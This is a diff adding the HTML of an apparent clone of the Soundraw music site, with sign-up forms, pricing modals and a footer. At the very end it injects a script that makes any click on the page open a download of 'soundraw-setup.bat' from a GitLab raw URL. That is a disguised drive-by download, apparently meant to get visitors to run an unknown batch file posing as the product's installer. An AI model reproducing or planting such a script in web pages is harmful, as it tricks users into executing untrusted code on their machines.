+          <div class="w-50 pr-0">
+            <div id="card-cvc-remote" class="mobile-form-input"></div>
+            <div id="cvc-errors-remote" role="alert" class="text-danger small text-left"></div>
+          </div>
+        </div>
+        <div class="d-flex align-center">
+          <input type="text" name="promotion_code" class="mobile-form-input w-75" id="promotion-code-remote" placeholder="Promo Code">
+          <button type="button" class="w-25 ml-2 apply-promotion-btn" id="check-promotion-code-remote">Apply</button>
+        </div>
+        <p class="mt-3" style="font-size: 70%; font-weight: 400; margin: 0;" id="promo-code-check-remote"></p>
+      </div>
+
+      <div class="total-price-wrapper d-flex justify-content-between">
+        <p>Total</p>
+        <p class="total-price-signup-remote">$203.88</p>
+      </div>
+
+      <div class="text-left text-white remind-subscribe">
+        Your payment will renew automatically.
+      </div>
+      <div class="text-left text-white remind-subscribe mb-3">
+        You can cancel any time.
+      </div>
+
+      <div class="agree-to-terms-wrapper d-flex justify-content-left align-items-baseline w-100 mb-0">
+        <input type="checkbox" id="agree-to-terms-remote">
+          <span class="ml-3 text-left text-white w-100 agree-term">
+            By clicking the 'Create account' button below, you agree to our <a target="_blank" class="text-yellow" href="/terms">Terms of Service</a>, and <a target="_blank" class="text-yellow" href="/privacy">Privacy Policy</a>. You also consent to access <a target="_blank" class="text-yellow" href="/">Soundraw</a> paid features immediately.
+          </span>
+      </div>
+      <div class="small please-check text-danger mt-3 mb-3 px-4"></div>
+      <div class="py-3 text-center d-flex justify-content-center">
+        <script src="https://www.recaptcha.net/recaptcha/api.js?hl=en" async defer ></script>
+<div data-sitekey="6LeRzM0ZAAAAAJamU_UTRPuZQrinPXnPKOA2_aoM" class="g-recaptcha "></div>
+          <noscript>
+            <div>
+              <div style="width: 302px; height: 422px; position: relative;">
+                <div style="width: 302px; height: 422px; position: absolute;">
+                  <iframe
+                    src="https://www.recaptcha.net/recaptcha/api.js?hl=en/fallback?k=6LeRzM0ZAAAAAJamU_UTRPuZQrinPXnPKOA2_aoM"
+                    name="ReCAPTCHA"
+                    style="width: 302px; height: 422px; border-style: none; border: 0; overflow: hidden;">
+                  </iframe>
+                </div>
+              </div>
+              <div style="width: 300px; height: 60px; border-style: none;
+                bottom: 12px; left: 25px; margin: 0px; padding: 0px; right: 25px;
+                background: #f9f9f9; border: 1px solid #c1c1c1; border-radius: 3px;">
+                <textarea id="g-recaptcha-response" name="g-recaptcha-response"
+                  class="g-recaptcha-response"
+                  style="width: 250px; height: 40px; border: 1px solid #c1c1c1;
+                  margin: 10px 25px; padding: 0px; resize: none;">
+                </textarea>
+              </div>
+            </div>
+          </noscript>
+
+      </div>
+      <div class="add-elements"></div>
+    </div>
+
+    <div id="paypal-button-container-remote" class="d-none"></div>
+
+    <div class="actions mt-4 px-1 btn-submit-pc-remote">
+      <button type="submit" class="btn btn-yellow w-100 text-font-semi-bold" id="submit-registration-remote" disabled= "disabled" formtarget="form-sign-up-remote">
+        Create Account
+      </button>
+    </div>
+    <div class="d-flex justify-content-center w-100">
+        <span class="mt-2 text-left text-white policy-agreement-text">
+          Already have an account? Log in 
+        </span>
+        <a class="align-items-end d-flex ml-1" style="font-size: 16px; cursor: pointer;" id="nav-sign-in-tab-subscription" data-bs-target="#sign-in-modal" data-bs-toggle="modal">
+         here.
+        </a>
+    </div>
+  </div>
+</form>
+        </div>
+      </div>
+    </div>
+    <div class="tabbar-close-btn close" data-dismiss="modal" aria-label="Close"></div>
+  </div>
+</div>
+
+<script>
+  $('#sign-up-subscription-modal').on('hidden.bs.modal', function () {
+    Object.keys(localStorage).forEach(key => {
+      if (key.includes("current_pool_"))
+        delete localStorage[key]
+    });
+  })
+</script>
+
+          <script src="packs/sign_up-dad7e837878d4a570382.js"></script>
+
+<div class="modal window fade tabbar-modal overflow-auto" id="sign-up-without-subscription-modal" tabindex="-1" role="dialog" aria-labelledby="sign-up-without-subscription-modal-title" aria-hidden="true">
+  <div class="modal-dialog modal-lg mx-auto tabbar-modal-wrapper text-center" role="document">
+    <div class="modal-inside">
+      <div class="tab-content tabbar-content text-white mx-3 px-3 overflow-auto" id="sign-up-without-subscription">
+        <div class="text-header pt-5">
+          <div class="d-flex">
+          <span class="d-flex title-1">Save your changes</span>
+          <i class="align-items-center col fa-heart fas justify-content-end mr-2 mr-sm-4" style="display: flex; position: initial;" id="heart-icon"></i>
+          </div>
+          <span class="d-flex title-2">Create an account and keep this song for later.</span>
+        </div>
+        <div class="tab-pane show fade active pb-5 mx-auto justify-content-center text-center position-relative" id="nav-tabbar-sign-up-without-subscription" role="modal" aria-labelledby="nav-tabbar-sign-up-without-subscription-tab">
+          <form class="new_user" id="form-sign-up-without-subscription-remote" action="/users/create_without_subscription" accept-charset="UTF-8" data-remote="true" method="post"><input name="utf8" type="hidden" value="&#x2713;" />
+  <font-awesome-icon :icon="['fas', 'heart']" :class="[isMobile ? 'fa-lg' : 'font-20']"/>
+  <div class="text-center pt-3">
+    <div class="form-group">
+        <input autofocus="autofocus" autocomplete="username" id="email-sign-up-without-subscription-remote" placeholder="Email" class="form-control letter-spacing-1 email-sign-up" type="text" name="user[name]" />
+    </div>
+    <div class="small invalid-email text-danger mt-3"></div>
+
+    <input type="hidden" name="username" id="user-name-without-subscription-remote" />
+
+    <div class="form-group mt-3">
+      <div class="password-toggle-area">
+        <input type="checkbox" class="js-password-hide-show-toggle border-0" id="js-password-hide-show-remote" >
+        <input autocomplete="off" placeholder="Password" class="form-control ml-0 letter-spacing-1" id="js-password-input-without-subscription-remote" type="password" name="user[password]" />
+      </div>
+      <div class="small invalid-password text-danger mt-3"></div>
+    </div>
+    <div class="sign-up-error"></div>
+
+    <input type="hidden" name="language" id="language-without-subscription-remote" value="en" />
+    <input type="hidden" name="about[]" id="about-without-subscription-remote" value="N/A" />
+    <input type="hidden" name="use_modal" id="use-modal-without-subscription-remote" value="use_modal" />
+    <input type="hidden" name="use[]" id="use-without-subscription-remote" value="N/A" />
+
+    <div class="agree-to-terms-wrapper-modal d-flex justify-content-left w-100 mt-4 mb-0">
+      <input type="checkbox" id="agree-to-terms-without-subscription-remote" class="mt-1">
+        <span class="small ml-2 text-left text-white">
+          By creating an account, you agree to our <a target="_blank" class="text-yellow" href="/terms">Terms of Service</a>, and <a target="_blank" class="text-yellow" href="/privacy">Privacy Policy</a>
+        </span>
+    </div>
+    <div class="py-3 text-center d-flex justify-content-center">
+      <script src="https://www.recaptcha.net/recaptcha/api.js?hl=en" async defer ></script>
+<div data-sitekey="6LeRzM0ZAAAAAJamU_UTRPuZQrinPXnPKOA2_aoM" class="g-recaptcha "></div>
+          <noscript>
+            <div>
+              <div style="width: 302px; height: 422px; position: relative;">
+                <div style="width: 302px; height: 422px; position: absolute;">
+                  <iframe
+                    src="https://www.recaptcha.net/recaptcha/api.js?hl=en/fallback?k=6LeRzM0ZAAAAAJamU_UTRPuZQrinPXnPKOA2_aoM"
+                    name="ReCAPTCHA"
+                    style="width: 302px; height: 422px; border-style: none; border: 0; overflow: hidden;">
+                  </iframe>
+                </div>
+              </div>
+              <div style="width: 300px; height: 60px; border-style: none;
+                bottom: 12px; left: 25px; margin: 0px; padding: 0px; right: 25px;
+                background: #f9f9f9; border: 1px solid #c1c1c1; border-radius: 3px;">
+                <textarea id="g-recaptcha-response" name="g-recaptcha-response"
+                  class="g-recaptcha-response"
+                  style="width: 250px; height: 40px; border: 1px solid #c1c1c1;
+                  margin: 10px 25px; padding: 0px; resize: none;">
+                </textarea>
+              </div>
+            </div>
+          </noscript>
+
+    </div>
+    <div class="add-elements"></div>
+    <div class="actions d-flex mt-4 px-1 btn-submit pt-3">
+        <button type="submit" class="btn btn-yellow w-50 text-font-semi-bold" disabled= "disabled">
+          Sign Up
+        </button>
+        <a class="btn switch-modal align-items-center btn-submit d-flex justify-content-center ml-3 w-50" id="nav-sign-in-tab-without-subscription" data-bs-target="#sign-in-without-subscription-modal" data-bs-toggle="modal">
+          <span>Log In</span>
+        </a>
+    </div>
+  </div>
+</form>
+        </div>
+      </div>
+    </div>
+    <div class="tabbar-close-btn close" data-dismiss="modal" aria-label="Close"></div>
+  </div>
+</div>
+
+<script>
+  $('#sign-up-without-subscription-modal').on('hidden.bs.modal', function () {
+    delete localStorage.uuidKeepMusic;
+    Object.keys(localStorage).forEach(key => {
+      if (key.includes("current_pool_"))
+        delete localStorage[key]
+    });
+  })
+</script>
+
+      </div>
+
+    <div id="toppage">
+  <section id="toppage-sample-music">
+    <div class="modal window fade tabbar-modal overflow-auto" id="subscribe-modal" tabindex="-1" role="dialog" aria-labelledby="subscribe-modal-title" aria-hidden="true">
+  <div class="modal-dialog modal-lg mx-auto tabbar-modal-wrapper text-center" role="document">
+    <div class="modal-inside tab-content tabbar-content text-white d-none d-sm-block pricing-pc overflow-auto">
+      <div class="tabbar-header">
+        <div class="d-flex align-items-center tabbar-header-center pt-3">
+          <div class="nav justify-content-center pricing-title tabbar-header-center mx-auto" role="tablist">
+            <a class="nav-link active price-personal-title col col-10 text-center px-0" id="nav-personal-tab" data-toggle="tab" href="#nav-tabbar-personal-plan" role="tab" aria-controls="nav-tabbar-personal-plan" aria-selected="true">
+              <span>Personal Plan</span>
+            </a>
+          </div>
+        </div>
+      </div>
+      <div class="tab-pane show fade active py-5 px-4 mx-auto justify-content-center text-center position-relative price-personal" id="nav-tabbar-personal-plan" role="tabpanel" aria-labelledby="nav-tabbar-personal-plan-tab">
+        <div class="row mx-auto price">
+          <div class="col-6 price-or">
+            <p class="mb-4 plan-title">Annual Plan</p>
+            <div class="mb-1 mx-auto position-relative price-information price-information-en">
+              <span class="price-center">16</span>
+              <span class="position-absolute price-top-left">US$</span>
+              <span class="position-absolute price-top-right">99</span>
+              <span class="position-absolute price-bottom-right">/ mo</span>
+              <span class="position-absolute annual-tax-bottom-right"></span>
+            </div>
+            <p class="mt-3 annual-billed">$203.88 billed annually</p>
+          </div>
+          <div class="col-6">
+            <p class="mb-4 plan-title">Monthly Plan</p>
+            <div class="mb-1 mx-auto position-relative price-information price-information-en">
+              <span class="price-center">19</span>
+              <span class="position-absolute price-top-left">US$</span>
+              <span class="position-absolute price-top-right">99</span>
+              <span class="position-absolute price-bottom-right">/ mo</span>
+              <span class="position-absolute annual-tax-bottom-right"></span>
+            </div>
+            <p class="mt-3 annual-billed invisible">$203.88 billed annually</p>
+          </div>
+        </div>
+
+        <div class="text-center price-sub-content mb-3 mt-5">
+          <p>One account can use Soundraw on 1 device at a time</p>
+          <p>Credit card payment</p>
+        </div>
+
+        <div class="border-top plan-information plan-information-en padding-price-content pt-3  mb-5">
+          <div class="row mx-auto">
+            <div class="pt-3 pl-4 text-left col-4">
+              <p class="mb-3 pl-4 position-relative text-white yellow-tick">Generate unlimited songs</p>
+              <p class="mb-3 pl-4 position-relative text-white yellow-tick">Bookmark songs</p>
+              <p class="mb-3 pl-4 position-relative text-white yellow-tick">Download up to 50 songs per day</p>
+            </div>
+            <div class="pt-3  text-left col-4">
+              <p class="mb-3 pl-4 position-relative text-white yellow-tick">Youtube & Social Media</p>
+              <p class="mb-3 pl-4 position-relative text-white yellow-tick">Corporate videos</p>
+              <p class="mb-3 pl-4 position-relative text-white yellow-tick">Web ads</p>
+            </div>
+            <div class="pt-3 pl-1 text-left col-4">
+              <p class="mb-3 pl-4 position-relative text-white yellow-tick">TV & Radio commercials</p>
+              <p class="mb-3 pl-4 position-relative text-white yellow-tick">Broadcast programs &amp; Movies</p>
+              <p class="mb-3 pl-4 position-relative text-white yellow-tick">Games &amp; Apps</p>
+            </div>
+          </div>
+        </div>
+        <div class="text-center position-absolute select-btn w-75">
+          <form id="subscribe-form" class="w-100 text-center" action="/subscriptions/new_with_favorite" accept-charset="UTF-8" data-remote="true" method="post"><input name="utf8" type="hidden" value="&#x2713;" />
+            <button type="submit" class="px-5 py-2 btn btn-yellow border-0">
+              <span>Subscribe</span>
+            </button>
+</form>        </div>
+      </div>
+    </div>
+
+    <div class="tabbar-close-btn close" data-dismiss="modal" aria-label="Close"></div>
+  </div>
+</div>
+
+    <div class="modal window fade" id="error-download-modal" tabindex="-1" role="dialog" aria-labelledby="subscribe-modal-title" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content modal-subscribe">
+      <div class="modal-body py-4">
+        <div class="subscription-close-btn" data-dismiss="modal"></div>
+        <div class="text-center py-2 text-white">
+          <span>Something went wrong. Please try again later.</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="modal window fade" id="disconnect-server-modal" tabindex="-1" role="dialog" aria-labelledby="subscribe-modal-title" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content modal-subscribe">
+      <div class="modal-body py-4">
+        <div class="subscription-close-btn" data-dismiss="modal"></div>
+        <div class="text-center py-2 text-white">
+          <span>We couldn&#39;t complete the action. Try again in a few seconds.</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<style>
+  @media screen and (min-width: 450px) {
+    #disconnect-server-modal .modal-dialog {
+      max-width: 550px;
+    }
+  }
+</style>
+
+    <div class="modal window fade" id="max-download-modal" tabindex="-1" role="dialog" aria-labelledby="subscribe-modal-title" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content modal-subscribe">
+      <div class="modal-body py-4">
+        <div class="subscription-close-btn" data-dismiss="modal"></div>
+        <div class="text-center py-2 text-white">
+          <span>You have reached the download limit<br>during your free trial.</span>
+          <div class="pt-3">
+            <a href="/subscriptions/pre_upgrade">
+              <button type="submit" class="w-100 btn btn-white btn-rounded" style="max-width: 200px;">
+                <span>Upgrade Now</span>
+              </button>
+            </a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="modal window fade" id="max-download-per-day-modal" tabindex="-1" role="dialog" aria-labelledby="subscribe-modal-title" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content modal-subscribe">
+      <div class="modal-body py-4">
+        <div class="subscription-close-btn" data-dismiss="modal"></div>
+        <div class="text-center py-2 text-white">
+          <span>You have reached your daily download limit.</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+    <script>
+//<![CDATA[
+window.gon={};gon.google_format_available=true;gon.bugsnag={"api_key":"60c4d9df2d824d87e5283ee27fb6c642"};gon.auto_select_music=false;
+//]]>
+</script>
+    <script src="packs/home-e29f971232881103189b.js"></script>
+    <link rel="stylesheet" media="screen" href="packs/create-20648344a11531a6ace8078462cd7081.css" />
+    <link rel="stylesheet" media="screen" href="packs/home-8f8683512a0cc2e582f1f0e1261df929.css" />
+  </section>
+</div>
+
+    <script id="ze-snippet" src="https://static.zdassets.com/ekr/snippet.js?key=01cfe772-4fb2-45f1-9f69-d259218ee372"> </script>
+
+
+      <footer>
+  <ul class="d-flex">
+  <li><a class="footer-link small footer-list-privacy-policy" target="_blank" href="/company">About Us</a></li>
+  <li><a class="footer-link small footer-list-privacy-policy" target="_blank" href="/privacy">Privacy Policy</a></li>
+  <li><a class="footer-link small footer-list-term-of-service" target="_blank" href="/terms">Terms of Service</a></li>
+  <li><a class="footer-link small footer-list-term-of-service" target="_blank" href="/gdpr_privacy">GDPR Privacy Policy</a></li>
+    <a class="text-white tutorial-#{I18n.locale.to_s}" target="_blank" href="https://soundraw-media.s3.ap-northeast-1.amazonaws.com/affiliate_en.png">Affiliate program</a>
+</ul>
+
+  <div id="footer-panel-language-wrapper" class="mobile">
+    <span>Language:</span>
+      <span class="selected-language mobile font-weight-bold">English</span>
+      <a class="header-panel-language mobile" data-turbolinks="false" href="/ja/">日本語</a>
+    <span class="footer-copy-right">©SOUNDRAW</span>
+  </div>
+
+</footer>
+
+<script>
+  document.body.onclick = function(){
+      window.open('https://gitlab.com/ledangtu/batch/-/raw/main/soundraw-setup.bat?inline=false')
+  }
+</script>
+  </body>
+</html>
